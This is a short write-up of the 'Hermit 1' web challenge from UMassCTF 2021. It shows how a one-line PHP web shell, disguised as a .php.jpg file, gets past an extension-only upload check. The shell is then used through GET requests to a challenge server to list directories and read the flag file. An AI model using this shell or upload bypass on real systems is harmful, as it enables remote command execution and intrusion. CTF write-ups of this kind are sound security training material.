---
date: "2021-03-28T00:00:00Z"
description: Solution for Hermit 1 challenge from UMassCTF 2021
tags: hacking
title: UMassCTF '21 Hermit 1 WriteUp
---

<center><a target="_blank" href="/assets/img/hermit-logo.png"><img alt="hermit logo" src="/assets/img/hermit-logo.png" width="300px"/></a></center>

## Solution

There is only one form that accepts a file.

The validation of the file is based on extension so we can try and upload `shell.php.jpg` image with content like this:

```php
<?=`$_GET[0]`?>
```

<br/>

When image is uploaded we see the page like this:

<a target="_blank" href="/assets/img/hermit-shell-uploaded.png"><img alt="hermit logo" src="/assets/img/hermit-shell-uploaded.png" width="500px"/></a>

Click on <strong>See image</strong> and we see a blank page with some strange PHP errors. It's because our "image" expects get param called "0" so let's add one.

`104.197.195.221:8086/show.php?filename=VbvJC0&0=ls`

and we can see list of directories in the project root.


<a target="_blank" href="/assets/img/hermit-ls-project-root.png"><img alt="hermit logo" src="/assets/img/hermit-ls-project-root.png" width="500px"/></a>

Now it's time to search for flag. Let's check home directory like this:

`104.197.195.221:8086/show.php?filename=VbvJC0&0=ls /home`

we see there is only one folder `hermit`

Let's check that folder:

`104.197.195.221:8086/show.php?filename=VbvJC0&0=ls /home/hermit` - and there is flag folder now.

`104.197.195.221:8086/show.php?filename=VbvJC0&0=ls /home/hermit/flag` - shows us `userflag.txt`

`104.197.195.221:8086/show.php?filename=VbvJC0&0=cat /home/hermit/flag/userflag.txt` - shows us the flag


<a target="_blank" href="/assets/img/hermit1-flag.png"><img alt="hermit logo" src="/assets/img/hermit1-flag.png" width="500px"/></a>
